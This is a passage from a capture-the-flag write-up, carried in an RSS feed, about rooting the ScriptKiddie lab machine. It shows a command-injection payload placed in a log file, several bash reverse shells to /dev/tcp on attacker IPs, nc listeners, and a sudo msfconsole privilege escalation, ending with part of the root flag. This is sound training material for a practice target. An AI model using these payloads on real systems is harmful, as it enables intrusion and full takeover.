</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;&#34;</span> <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f3- <span class="p">|</span> sort -u
</span></span><span class="line"><span class="cl">127.0.0.1<span class="p">;</span> bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;</span><span class="p">;</span>
</span></span></code></pre></div><p>If I map that format to this line:</p>
<pre tabindex="0"><code>sh -c &#34;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null&#34;
</code></pre><p>It turns into this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sh -c <span class="s2">&#34;nmap --top-ports 10 -oN recon/127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;.nmap 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;; 2&gt;&amp;1 &gt;/dev/null&#34;</span>
</span></span></code></pre></div><h4 id="exploitation">Exploitation</h4>
<p>Since the logs is cleared automatically, I&rsquo;ll use while loop to keep inserting my malicious log to the <code>hackers</code> file and I&rsquo;ll wait on my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~/logs$ <span class="k">while</span> sleep 0.1<span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="s2">&#34;[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9001 0&gt;&amp;1&#39;;&#34;</span> &gt; hackers<span class="p">;</span> <span class="k">done</span>
</span></span></code></pre></div><p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">→ root@kali «scriptkiddie» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9001</span>             
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.226<span class="o">]</span> <span class="m">33110</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>868<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">pwn@scriptkiddie:~$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>pwn<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>pwn<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>pwn<span class="o">)</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210614115903137.png" alt="image-20210614115903137"  /></div>
</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="sudo---msfconsole">Sudo - msfconsole</h4>
<p>User <code>pwn</code> is allowed to run <code>msfconsole</code> as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwn@scriptkiddie:~$ sudo -l
</span></span><span class="line"><span class="cl">sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> pwn on scriptkiddie:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User pwn may run the following commands on scriptkiddie:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
</span></span></code></pre></div><p>To exploit this I can just send a reverse shell using  <code>-x</code> options and then I&rsquo;ll wait on my <code>nc</code> listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwn@scriptkiddie:~$ sudo msfconsole -q -x <span class="s1">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9005 0&gt;&amp;1&#34;&#39;</span>
</span></span></code></pre></div><p>And I&rsquo;m rooted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «scriptkiddie» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ rlwrap nc -nvlp <span class="m">9005</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9005</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.226<span class="o">]</span> <span class="m">43512</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>868<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">root@scriptkiddie:/home/pwn# id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">root@scriptkiddie:/home/pwn# cut -c-15 /root/root.txt
</span></span><span class="line"><span class="cl">cut -c-15 /root/root.txt
</span></span><span class="line"><span class="cl">bf7edd4c58e4420
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210614121311990.png" alt="image-20210614121311990"  /></div>
</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
